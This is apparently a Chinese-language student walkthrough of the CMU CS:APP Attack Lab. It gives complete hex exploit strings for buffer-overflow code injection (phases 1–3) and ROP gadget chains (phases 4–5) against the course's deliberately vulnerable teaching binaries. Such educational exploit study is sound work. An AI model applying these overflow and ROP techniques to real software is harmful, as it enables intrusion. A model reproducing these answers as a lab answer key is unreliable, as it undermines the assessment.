# Attack Lab

从[CMU官网](http://csapp.cs.cmu.edu/3e/labs.html)下载完所需实验包后，内有官方文档以及.tar压缩包，使用`tar -xvf targetk.tar`解压后，得到如下文件

>   The fifiles in target*k* include:
>
>   README.txt: A fifile describing the contents of the directory
>
>   ctarget: An executable program vulnerable to *code-injection* attacks
>
>   rtarget: An executable program vulnerable to *return-oriented-programming* attacks
>
>   cookie.txt: An 8-digit hex code that you will use as a unique identififier in your attacks.
>
>   farm.c: The source code of your target’s “gadget farm,” which you will use in generating return-oriented
>
>   programming attacks.
>
>   hex2raw: A utility to generate attack strings.

我们还是将答案保存在`answer.txt`，这里运行 `./ctarget -q` 要用 `-q` ，（参考官方文档）毕竟不是 CMU 的学生，`-q` 的作用: `Don’t send results to the grading server` 。

这次的 lab 要仔细看官方的文档，里面是题目的要求，也包含解题指导，对解决问题很有帮助。

这次 lab 就是输入攻击字符串，实现调用函数等目的，包含了对栈破坏，注入代码，ROP 攻击等方法，说明了栈溢出的危害。这里要使用 `unix> ./hex2raw < result.txt | ./ctarget` 来运行查看解答是否正确，运行方法不唯一，总之只要把得出答案经过hex2raw后的结果当做ctarget的输入即可。解答保存在 `answer.txt` 中，这里命令中的 `|`表示管道，就是把前面的输出作为后面的输入，`./hex2raw` 根据输入的 16 进制字符串生成攻击字符串，也就是我们的答案是十六进制的字符串形式，每个字节中间要用空格或换行进行分割（详细见官方文档）；

同样的，和bomb lab一样，需要对所给的可执行程序生产汇编代码，`objdump -d ctarget > ctarget.d`。

##  **Part I: Code Injection Attacks**

这一部分共三题，都是代码注入攻击。该程序的设置方式为堆栈位置在每次运行之间将是一致的，因此堆栈上的数据可以被视为可执行代码，即程序并没有开启栈随机化。

###  **Phase 1**

>    Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

本题要求我们输入字符串攻击`getbuf`，使其在执行返回指令时，执行`touch`函数，而不是返回`test`函数。

查看`getbuf`函数

```assembly
00000000004017a8 <getbuf>:                                                                                     
	 4017a8:   48 83 ec 28             sub    $0x28,%rsp
	 4017ac:   48 89 e7                mov    %rsp,%rdi
	 4017af:   e8 8c 02 00 00          callq  401a40 <Gets>
	 4017b4:   b8 01 00 00 00          mov    $0x1,%eax
	 4017b9:   48 83 c4 28             add    $0x28,%rsp
	 4017bd:   c3                      retq   
```

注意第二行，栈有 `0x28` 即 40 个字节，注意 x86-64 在函数调用时会自动将返回地址压入栈，因此调用函数时栈顶就是返回地址，只要修改它就能调用其他的函数了，输入 40 个字节后，使栈溢出，再输入个地址就能破坏 `getbuf` 返回地址（因为栈是向下增长的，而读入的字符串会向高地址进行写入），返回时就会调用修改了的地址对应的函数，这里的是个八字节的 64 位地址，按题目要求就是 `touch1` 函数的地址， `00000000004017c0 <touch1>:` ，注意这里机器要用小端法存入地址写成： `c0 17 40 00 00 00 00 00` ，因此第一题答案就是任意 40 个字节加上该地址。
所以答案可以是：

```cpp
 41 41 41 41 41 41 41 41 41 41
 41 41 41 41 41 41 41 41 41 41
 41 41 41 41 41 41 41 41 41 41
 41 41 41 41 41 41 41 41 41 41
 c0 17 40 00 00 00 00 00 
```

###   Phase 2

>   Phase 2 involves injecting a small amount of code as part of your exploit string
>
>   第2阶段涉及注入少量代码作为攻击字符串的一部分。

touch2代码

```cpp
void touch2(unsigned val)
{  
    vlevel = 2; /* Part of validation protocol */ 
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

>   Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,however, you must make it appear to touch2 as if you have passed your cookie as its argument.
>
>   您的任务是让CTARGET执行touch2的代码，而不是返回测试。在这种情况下，然而，您必须使它看起来像touch2，就好像您已经将cookie作为参数传递了一样。

这题需要我们注入一些代码作为攻击一部分。同样的，需要跳转到`touch2`函数，这与上题一样，不同的是，这里我们要使用注射代码给寄存器`rdi`赋值，使其等于我们的cookie（cookie的值可以在同级目录cookie.txt中查看）。具体的，我们需要注射如下代码，将`rdi`正确赋值后，再通过`push` 函数`touch2`的首地址压入栈，随后`ret`出栈进入`touch2`。

```assembly
movq $0x59b997fa,%rdi
pushq $0x004017ec
retq
```

代码注入攻击，通常是输入给程序一个字符串，这个字符串包含一些可执行代码的字节编码，称为攻击代码，再利用一些字节使得一个指向攻击代码的指针将原来的返回地址覆盖，那么执行`ret`指令的效果就是跳转到攻击代码。

将注入代码保存为 `code.s` 文件，参考文档，使用 `gcc -c code.s` 编译，再用 `objdump -d code.o > code.d` 反汇编就能得到十六进制表示的机器代码了，将这段代码通过 `getbuf` 放入栈中（首地址在栈顶，可以通过 `gdb` 在栈空间开辟后打个断点，打印 `%rsp` 的值就是栈顶了），再和第一题一样填充到40字节，结尾加上注入代码的地址就是答案了。这样我们的攻击代码在栈空间开辟就存储在了栈顶的位置，随后通过`ret`再返回到攻击代码，执行攻击。

栈栈顶地址打印如下

<img src="Attack%20Lab.assets/attack_1_2.png" style="zoom:80%;" />

所以最终答案如下：

```c
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
41 41 41
41 41 41 41 41
41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 41 41
78 dc 61 55 00 00 00 00
```

###  Phase 3

本题也需要用到代码攻击，与上题中不同的是，本题要求以cookie的字符串地址形式作为参数传参到`touch3`中。但是注意因为第三题中，后续操作会将 buf 栈中的 40 个字节覆盖了，因为在`hexmatch`函数中开了110个字节，且使用随机数在这110个字节中的某个部分写入cookie的值，所以不能将我们注入的字符串存储在这里，改为存储在调用`getbuf`函数前的栈中，通过打断点得到其栈顶地址是 0x5561dca0 。所以应该把字符串存入的地址设为 0x5561dca8 ，这个地址在输入的 16 进制中就紧跟着跳转的地址。

<img src="Attack%20Lab.assets/attack_1_3.png" style="zoom:80%;" />

需要注入的代码经反编译如下：

```assembly
0000000000000000 <.text>:
       0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
       7:   68 fa 18 40 00          pushq  $0x4018fa
       c:   c3                      retq             
```

再和上题类似填充至 40 字节，附上跳转地址。再将 `cookie` 转化为 16 进制的字符串附到跳转地址后面，根据 `ASCII` 码，这里的 `cookie` 值 `0x59b997fa` 就是 `35 39 62 39 39 37 66 61` ，因而最终答案是：

```c
48 c7 c7 a8 dc 61 55 		/* 注入代码 */
68 fa 18 40 00 
c3 
30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00		/* touch3函数的地址 */
35 39 62 39 39 37 66 61  /* cookie 这里最后还可以加上 00 ,用作字符串结束标志，但hexmatch里调用的是strncmp，只比较前9个字符，所以加不加都可以 */
```



## **Part II: Return-Oriented Programming**

这部分的两题是Return-Oriented Programming，引入了栈随机化和限制了可执行代码区域。

>   It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.
>
>   It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.

栈随机化的思想使得栈的位置在程序每次运行时都有变化，因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。栈随机化使得栈上的地址不确定，**无法直接跳转到栈上的指定地址**。另一种是限制了哪些内存区域能存放可执行代码。在典型的程序中，只有保存编译器产生的代码的那部分内存才需要是可执行的。其他部分可以被限制为只允许读和写**。限制可执行代码区域就使得注入在栈上的代码无法执行。**

所以需要改变攻击方式，改用ROP攻击，**ROP的策略是识别现有程序中的字节序列由一条或多条指令组成，后跟指令ret**。这样的段称为*gadget*。简单来说就是利用函数自带的一些*gadget*，进行提取，使它们构成一个攻击链，利用程序自身的代码片段进行攻击，就能绕过这些安全限制。ROP 的具体讲解查看官方文档。

### Phase 4

这题要求在新的保护下重复第二题的结果，将 `cookie` 值传入 `%rdi` ，这里和第二题一样使得栈溢出，然后将返回地址设为 `gadgets` 攻击链的起始地址。

原本是想直接找`pop %rdi`但所给的`gadget farm`并没有，退而求其次，可以通过`pop %rax`将cookie从栈内读到`rax`中再通过`movq %rax ,%rdi`传送到第一个参数寄存器`rdi`上。通过查看`gadget farm`，可以发现有这样`gadgets`，如下：

```assembly
00000000004019a7 <addval_219>:
 928   4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax                                             
 929   4019ad:   c3                      retq
```

关于这些`gadgets`的查找，可以借助指导文档和vim的查找功能。 `58 90` 即是 `popq %rax` ，`90` 是 `nop` ，可以直接忽视，这段代码地址是 `0x4019ab` ，它将栈上的值存入了寄存器，接着发现：

```assembly
00000000004019c3 <setval_426>:
 944   4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)                                                 
 945   4019c9:   c3                      retq
```

 `48 89 c7` 就是 `movq %rax,%rdi` ，就通过`rax`将栈上的值存入了 `rdi` ，因此将 `cookie` 值存入栈中，就可以传值，这段代码地址是 `0x4019a2` 。

因此输入字符串先是一段填充的 40 字节，然后是跳转地址，设为 pop 的地址 `0x4019ab` ，接着存入 `cookie` 值（就是将要 pop 的那个值，注意应存入 64 位值），然后是 mov 的地址 `0x4019a2` ，最后跳转到 `touch2` ，这样一个完整的 ROP 攻击链就形成了，一个可行的答案就是：

```c
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
ab 19 40 00 00 00 00 00			/* popq的地址 */
fa 97 b9 59 00 00 00 00			/* cookie */
a2 19 40 00 00 00 00 00			/* mov的地址 */
ec 17 40 00 00 00 00 00			/* touch2的地址 */
```

具体逻辑图如下，手残谅解。

![](Attack%20Lab.assets/attack4-16660111803881.png)

### Phase 5

第五题与上题要求类似，也是要用ROP攻击，与第三题内容一样，也是以cookie的字符串地址形式作为参数传参到`touch3`中。

由于需要传cookie的字符串作为参数，但是由于栈随机化策略，我们无法知道存放字符串的绝对地址，只能根据运行时的%rsp进行推算。所以大致流程：将字符串放入栈中，得到`rsp`，对`rsp`做适当的偏移得到字符串`cookie`的地址；

一开始的想法是先保存`rsp`的值，例如`mov %rsp,%rax`,再将`rax`加上偏移量offset，后将`rax`的值赋给`rdi`,再调用函数`touch3`，即可。

但是我们发现所给gadget中并没有add的指令编码，但通看一遍可以发现有这么一函数:

```assembly
00000000004019d6 <add_xy>:
 956   4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
 957   4019da:   c3                      retq   
```

通过这个gadget也可以满足我们相加的要求，那么我们的做法就顺势变为了，将`rsp`的值赋值给`rdi`，将偏移量赋值给`rsi`。

 我们一步一步来，先将偏移量赋值给`rsi`，首先需要通过`pop rax`将偏移量`offset`放到`rax`，且也只能放到`rax`里面，因为`gadget`里面就只有`pop rax`这个寄存器的编码。所以需要通过`rax`将偏移量赋给`esi`，我们可以通过编码找到全部的传送指令，发现有`edx = eax , ecx = edx , esi = ecx`这样的三条形成的一条路，可以把`rax`将偏移量赋给`esi`。

现在来把`rsp`的值赋给`rdi`，同时`gadget`里面也只有`movl %rsp,%rax`这一条将`rsp`赋值给别的寄存器的指令编码，但好消息是，有`rdi = rax`这个传送指令的编码，所以我们已近可以顺利完成`rdi`和`rsi`的赋值。

随后我们使用上面发现的add_xy来对`rsp`加上偏移量来对`cookie`字符串的地址进行定位，现在通过`rdi = rax`这条指令即可将`rax`的值赋给`rdi`完成参数的传递，随后就是touch函数的地址，最后在放入`cookie`即可，`cookie`的值我们在phase3已近算过了， 为`35 39 62 39 39 37 66 61`。好，现在我们知道了`cookie`字符串的位置与`rsp`相差了32个字节，所以偏移量offset为0x20。至此整个ROP攻击链完成。

栈中数据大致流程如下：

```assembly
pop rax				0x4019ab		# 右边一列是指令的地址
offset	
edx = eax			4019dd
ecx = edx			401a34
esi = ecx 			0x401a13
rax = rsp			0401a06
rdi = rax 			0x4019c5	# rsp的指向
(%rdi,%rsi,1),%rax 	 0x4019d6
rdi = rax 			0x4019c5
touch3				0x4018fa
cookie
```

上方流程对应答案如下：

```assembly
41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 41 41
ab 19 40 00 00 00 00 00
20 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```

至此，整个实验完成，无疑完成了我的一个小小的黑客梦，此实验各级直接循序渐进，极好的提高了我对栈溢出的危害以及代码注入攻击和ROP攻击的认识，更加深切理解程序指令的执行流程。最后，整个过程也很有趣，值得一做。
